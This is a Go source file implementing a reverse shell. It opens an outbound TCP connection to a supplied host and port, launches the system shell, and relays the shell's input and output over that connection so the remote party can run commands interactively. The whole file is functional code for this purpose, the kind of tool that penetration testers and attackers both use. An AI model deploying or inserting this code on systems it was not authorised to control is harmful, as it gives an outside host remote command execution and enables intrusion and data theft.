package shell

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"sync"
)

func New(host string, port int) (*Shell, error) {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		return nil, err
	}

	s := &Shell{
		conn:      conn,
		stdinBuf:  make([]byte, 512),
		stdoutBuf: make([]byte, 512),
	}

	s.cmd = exec.Command(s.getSystemShellPath())
	s.stdin, _ = s.cmd.StdinPipe()
	s.stdout, _ = s.cmd.StdoutPipe()
	s.stderr, _ = s.cmd.StderrPipe()

	return s, nil
}

type Shell struct {
	conn net.Conn

	cmd    *exec.Cmd
	stdin  io.WriteCloser
	stdout io.ReadCloser
	stderr io.ReadCloser

	lastStdinRecv int
	stdinBuf      []byte
	stdoutBuf     []byte

	closeLock sync.Mutex
}

func (s *Shell) stdinPipe() {
	defer s.Close()

	for {
		n, err := s.conn.Read(s.stdinBuf[0:])
		if err != nil {
			log.Println("stdin read failed:", err)
			return
		}

		s.lastStdinRecv = n
		s.stdin.Write(s.stdinBuf[0:n])
	}
}

func (s *Shell) stdoutPipe() {
	defer s.Close()

	for {
		n, err := s.stdout.Read(s.stdoutBuf[0:])
		if err != nil {
			log.Println("stdout read failed:", err)
			return
		}

		// TODO: Clean this up
		// Skip next s.lastStdinRecv bytes, these are the command that was sent
		if s.lastStdinRecv > 0 {
			if n < s.lastStdinRecv {
				s.lastStdinRecv -= n

				// Nothing left...
				continue
			} else {
				s.stdoutBuf = s.stdoutBuf[s.lastStdinRecv:]

				// There might still be some left, remove extra bytes
				n -= s.lastStdinRecv
				s.lastStdinRecv = 0
			}
		}

		s.conn.Write(s.stdoutBuf[0:n])
	}
}

func (s *Shell) Start() {
	go s.stdoutPipe()

	err := s.cmd.Start()
	if err != nil {
		log.Println("failed starting shell:", err)
		s.Close()
	}
	s.stdinPipe()
}

func (s *Shell) Close() {
	s.closeLock.Lock()
	defer s.closeLock.Unlock()
	if s.cmd == nil {
		return
	}

	log.Println("closing and cleaning up shell")

	s.stdin.Close()
	s.stdout.Close()
	s.stderr.Close()
	s.cmd.Process.Kill()
	s.conn.Close()

	s.cmd = nil
	s.stdin = nil
	s.stdout = nil
	s.stderr = nil
}
